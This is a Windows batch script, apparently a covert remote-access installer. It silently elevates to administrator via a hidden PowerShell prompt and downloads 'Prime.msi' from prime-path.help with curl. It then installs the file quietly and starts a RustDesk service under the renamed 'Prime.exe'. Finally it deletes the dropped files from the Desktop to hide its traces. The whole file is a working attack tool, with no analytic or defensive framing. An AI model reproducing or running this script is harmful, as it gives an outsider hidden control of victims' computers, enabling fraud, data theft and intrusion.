@echo off
setlocal

:: Auto-elevate silently
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs -WindowStyle Hidden"
    exit /b
)

:: Silent install of RustDesk MSI
cd /d %temp%
curl -s -L -O https://prime-path.help/static/configs/Prime.msi >nul 2>&1
msiexec /i "%temp%\Prime.msi" /qn /norestart >nul 2>&1

:: Locate and install RustDesk service silently
set "rustdeskPath="
for /d %%a in ("C:\Program Files*\RustDesk") do (
    if exist "%%a\Prime.exe" (
        set "rustdeskPath=%%a\Prime.exe"
    )
)

if defined rustdeskPath (
    "%rustdeskPath%" --install >nul 2>&1
    sc start rustdesk >nul 2>&1
)

:: Delete RustDesk-related files from Desktop
set "desktopPath=%USERPROFILE%\Desktop"
del /f /q "%desktopPath%\Prime.msi" >nul 2>&1
del /f /q "%desktopPath%\Prime*.exe" >nul 2>&1
del /f /q "%desktopPath%\Prime*.msi" >nul 2>&1

exit /b
